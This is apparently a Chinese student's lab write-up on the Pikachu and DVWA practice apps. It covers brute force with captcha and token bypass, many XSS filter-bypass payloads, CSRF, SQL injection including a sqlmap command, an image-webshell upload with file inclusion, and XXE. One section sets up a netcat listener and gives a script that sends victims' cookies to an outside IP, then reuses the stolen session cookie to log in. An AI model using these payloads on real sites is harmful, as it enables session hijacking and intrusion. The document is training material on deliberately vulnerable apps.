# pikachu的暴力破解

#### 基于表单的暴力破解

![image-20250912194110053](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912194110053.png)

#### 验证码绕过(on server)   前端验证码，可以重复利用

![image-20250912194531243](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912194531243.png)

#### 验证码绕过(on client)   可以重复利用

![image-20250912194817867](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912194817867.png)



#### token防爆破?

![image-20250912194927118](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912194927118.png)

#### 捕获token

![image-20250912195141232](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912195141232.png)

#### 第二份token递归提取

![image-20250912195244326](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912195244326.png)



#### 鱼叉爆破成功

![image-20250912195341029](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250912195341029.png)





## 反射型xss(get)

![image-20250914161556464](images/image-20250914161556464.png)

破除限长

![image-20250914161621561](images/image-20250914161621561.png)



## 反射性xss(post)

```
<script>alert(document.cookie)</script>
```

![image-20250914161822085](images/image-20250914161822085.png)







## 存储型xss

```
<script>alert(document.cookie)</script>
```

![image-20250914161912616](images/image-20250914161912616.png)





## DOM型xss

被拼接到了a标签

![image-20250914162205006](images/image-20250914162205006.png)



## DOM型xss 2 

和上一题一样

![image-20250914162428647](images/image-20250914162428647.png)



## xss盲打

```
<script>alert(1)</script>
```

![image-20250914162812061](images/image-20250914162812061.png)



## xss之过滤   script被过滤了

![image-20250914162839325](images/image-20250914162839325.png)

用a标签代替

```
<a href="" onclick="alert('xss')">
```

![image-20250914162948764](images/image-20250914162948764.png)





## xss之htmlspecialchars

被拼接到a标签

![image-20250914181703824](images/image-20250914181703824.png)

```
' onclick='alert("xss")
```

![image-20250914181801219](images/image-20250914181801219.png)



## xss之href输出

![image-20250914181837834](images/image-20250914181837834.png)

被转义，无法闭合

![image-20250914182109696](images/image-20250914182109696.png)

用JavaScript

```
javascript:alert(1)
```

![image-20250914182147932](images/image-20250914182147932.png)



## xss之js输出

```
</script><script>alert('xss')</script>
```

![image-20250914182357442](images/image-20250914182357442.png)

闭合前面的script





## CSRF(get)

第一个是get

![image-20250914182659197](images/image-20250914182659197.png)

get直接生成poc

![image-20250914184128185](images/image-20250914184128185.png)

## CSRF(post)

同上，正常需要配合存储型dom





## sql  数字型注入

##### 确定数字型

![image-20250914185205405](images/image-20250914185205405.png)

联合查询版本

**![image-20250914185352499](images/image-20250914185352499.png)**

### 字符型注入（get）

![image-20250914185451764](images/image-20250914185451764.png)

单引号破坏结构报错

```
1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --+&submit=查询
```

![image-20250914185756624](images/image-20250914185756624.png)



### 搜索型注入

```
python sqlmap.py -u "http://47.242.11.182:8080/vul/sqli/sqli_search.php?name=1&submit=搜索" --dbs
```













上传一个img直接连接

![image-20250914192007576](images/image-20250914192007576.png)

## 服务端check

如图

![image-20250914192205824](images/image-20250914192205824.png)



做一个优质的图片马

![image-20250914192328820](images/image-20250914192328820.png)

上传图片马

![image-20250914193517302](images/image-20250914193517302.png)

```
/vul/unsafeupload/uploads/2025/09/14/70963868c6a952e4327478598094.png
```

```
filename=../../unsafeupload/uploads/2025/09/14/70963868c6a952e4327478598094.png&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

文件包含连接

![image-20250914194300577](images/image-20250914194300577.png)



## xxe漏洞

```
<?xml version="1.0" encoding="UTF-8" ?>
 
<!DOCTYPE note [
    <!ENTITY test "hello world">
]>
 
<name>&test;</name>

```

![image-20250914200111271](images/image-20250914200111271.png)



# 1 xss dom

## low

![image-20250827190958150](images/image-20250827190958150.png)

#### default有可能是个传参点

```
http://8.148.75.207:55/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E
```

![image-20250827191016233](images/image-20250827191016233.png)



## mid

```
http://8.148.75.207:55/vulnerabilities/xss_d/?default=%3Cimg%20src=#%20onerror=alert(1)%3E
```

![image-20250827191529384](images/image-20250827191529384.png)



## high

```
http://8.148.75.207:55/vulnerabilities/xss_d/?default=Spanish#%3Cscript%3Ealert(1)%3C/script%3E
```

![image-20250827191803204](images/image-20250827191803204.png)



# xss(reflected)

## low

```
http://8.148.75.207:55/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
```

![image-20250827192026124](images/image-20250827192026124.png)

## mid

```
http://8.148.75.207:55/vulnerabilities/xss_r/?name=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E
```

![image-20250827192133605](images/image-20250827192133605.png)

## high

```
http://8.148.75.207:55/vulnerabilities/xss_r/?name=%3Cimg%20src%20=%201%20onerror%20=%20alert(1)%3E#
```

![image-20250827192617660](images/image-20250827192617660.png)



# xss stored

## low

![image-20250827192856383](images/image-20250827192856383.png)

![image-20250827193003798](images/image-20250827193003798.png)

![image-20250827193027523](images/image-20250827193027523.png)

每次进入网站会弹出来

![image-20250827193058995](images/image-20250827193058995.png)



## mid

##### 删除low的记录

![image-20250827193159912](images/image-20250827193159912.png)

同样先修改字符限制，在写入XSS代码,<script>标签被过滤了

![image-20250827193352011](images/image-20250827193352011.png)

双写解决

```
<scri<script>pt>alert(1)</script>
```

![image-20250827193640965](images/image-20250827193640965.png)

成功弹窗

![image-20250827193718952](images/image-20250827193718952.png)



# high

#### 删除mid记录

```

```

![image-20250827194217614](images/image-20250827194217614.png)

![image-20250827194237528](images/image-20250827194237528.png)



服务器安装nc开启监听

```
sudo apt install netcat-openbsd -y
nc -lvp 8888
```

![image-20250827194704478](images/image-20250827194704478.png)

传本机的cookie到nc机器

```
<script>new Image().src="http://13.75.42.219:8888/?output="+document.cookie;</script>

```

![image-20250827195004192](images/image-20250827195004192.png)

nc机器成功监听到cookie

![image-20250827195531542](images/image-20250827195531542.png)

获取cookie

```
GET /?output=PHPSESSID=59147pmbmgig63dgmdeubu7827;%20security=low HTTP/1.1
```



# 作业三 通过cookie登录

此时新设备登录没有密码

![image-20250827200736809](images/image-20250827200736809.png)

hackback构造cookie成功登录进去

![image-20250827204605959](images/image-20250827204605959.png)